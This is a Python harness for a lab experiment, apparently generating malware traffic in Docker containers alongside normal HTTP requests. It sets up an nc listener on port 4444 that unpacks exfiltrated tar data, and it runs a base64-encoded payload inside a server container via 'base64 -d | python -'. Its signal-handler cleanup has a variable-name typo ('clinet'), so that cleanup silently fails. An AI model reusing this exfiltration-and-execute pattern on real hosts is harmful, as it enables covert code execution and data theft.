#!/usr/bin/env python3

import asyncio
import httpx
import logging
import signal
import time
import socket
import random
import os
import base64
import docker
from random import random
from datetime import datetime

run = True
container_name = None


def handler_stop_signal(signum, frame):
    print("Stopping...")
    global run
    global container_name
    run = False
    if container_name:
        try:
            clinet = docker.from_env()
            container = client.containers.get(container_name)
            container.kill()
            network = client.networks.get("malware_network")
            container = client.containers.get("simqas_server_1")
            network.disconnect(container)
            network.remove()
        except:
            pass
        container_name = None


signal.signal(signal.SIGTERM, handler_stop_signal)
signal.signal(signal.SIGINT, handler_stop_signal)


async def call(client):
    await asyncio.sleep(random())
    url = "http://localhost:8000"
    response = await client.get(url)
    response.raise_for_status()
    return response


async def client(start):
    logging.info("Starting client and Malware attack")

    num_clients = 1
    num_requests = 1
    lock = asyncio.Lock()
    while run:
        asyncio.create_task(malware(lock))
        for i in range(num_clients):
            logging.info(f"client #{i}")
            async with httpx.AsyncClient(timeout=10.0) as client:
                logging.info(f"#{i} launching requests")
                results = await asyncio.gather(
                    *[call(client) for _ in range(num_requests)], return_exceptions=True
                )
                logging.info(results)
        await asyncio.sleep(random() + 1)


async def malware(lock):
    async with lock:
        global container_name
        with open("modes/malware_send.py", "rb") as mfile:
            mdata = base64.b64encode(mfile.read())

        client = docker.from_env()
        container = client.containers.get("simqas_server_1")
        await asyncio.sleep(1)
        network = client.networks.create(
            "malware_network",
            driver="bridge",
            ipam=docker.types.IPAMConfig(
                pool_configs=[
                    docker.types.IPAMPool(
                        subnet="192.168.60.0/24", gateway="192.168.60.254"
                    )
                ]
            ),
        )
        await asyncio.sleep(1)
        network.connect(container, ipv4_address="192.168.60.2")

        logging.info("Starting nc listen")
        await asyncio.sleep(1)
        malware_server = client.containers.run(
            "busybox",
            "/bin/sh -c 'nc -p 4444 -l | tar -x -C /tmp/extracted'",
            volumes=["/tmp/extracted:/tmp/extracted"],
            detach=True,
            auto_remove=True,
        )
        await asyncio.sleep(1)

        network.connect(malware_server, ipv4_address="192.168.60.4")
        container_name = malware_server.name
        logging.info("Running malware on container")
        code, output = container.exec_run(
            "/bin/sh -c 'echo ${MALWARE} | base64 -d | python -'",
            environment={"MALWARE": mdata, "MALWARE_SERVER": "192.168.60.4"},
        )
        logging.info("%d: %s", code, output.decode("utf-8"))
        await asyncio.sleep(1)
        try:
            malware_server.kill()
        except:
            pass
        network.disconnect(container)
        network.remove()
        container_name = None
        await asyncio.sleep(5)


def main():
    logging.info("Starting experiment in malware mode")

    elapsed = time.perf_counter()
    start = datetime.now().astimezone().replace(microsecond=0).isoformat()
    asyncio.run(client(elapsed))
    end = datetime.now().astimezone().replace(microsecond=0).isoformat()
    elapsed = time.perf_counter() - elapsed

    logging.info(f"Normal mode executed in {elapsed:.2f} seconds")
    logging.info(f"Start time: {start} End time: {end}")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()
